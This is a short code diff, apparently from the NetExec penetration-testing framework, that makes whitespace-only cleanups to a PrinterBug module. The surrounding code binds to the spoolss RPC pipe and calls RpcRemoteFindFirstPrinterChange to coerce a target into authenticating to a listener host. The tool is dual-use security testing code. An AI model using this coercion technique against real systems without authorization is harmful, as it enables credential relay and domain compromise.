@@ -39,7 +39,6 @@ class NXCModule:
             trigger.RpcRemoteFindFirstPrinterChange(dce, self.listener, target)
             context.log.highlight("VULNERABLE")
             dce.disconnect()
-
         else:
             context.log.debug("Target is not vulnerable to PrinterBug")
 
@@ -49,12 +48,11 @@ class NXCModule:
 ################################################################################
 
 
-
 class TriggerAuth:
     def __init__(self, context):
         self.context = context
+
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
-        
         rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\spoolss]" % target)
         rpctransport.set_dport(445)
 
@@ -80,7 +78,7 @@ class TriggerAuth:
             self.context.log.debug(f"Something went wrong, check error status => {e!s}")
             return None
         try:
-            dce.bind(rprn.MSRPC_UUID_RPRN)            
+            dce.bind(rprn.MSRPC_UUID_RPRN)
         except Exception as e:
             self.context.log.debug(f"Something went wrong, check error status => {e!s}")
             return None
